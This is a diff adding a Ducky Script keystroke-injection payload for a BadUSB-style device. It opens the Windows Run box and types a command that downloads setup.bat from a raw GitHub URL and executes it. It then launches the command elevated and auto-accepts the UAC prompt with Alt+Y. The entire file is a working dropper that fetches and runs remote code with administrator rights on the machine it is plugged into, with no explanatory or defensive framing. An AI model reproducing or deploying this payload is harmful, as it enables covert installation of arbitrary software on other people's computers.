@@ -1,0 +1,8 @@
+DELAY 500
+GUI r
+DELAY 700
+STRING cmd /k powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/mGv73/cmd/refs/heads/main/setup.bat?version=latest -OutFile setup.bat" & setup.bat
+CTRL SHIFT ENTER
+DELAY 1200
+ALT Y
+ALT A
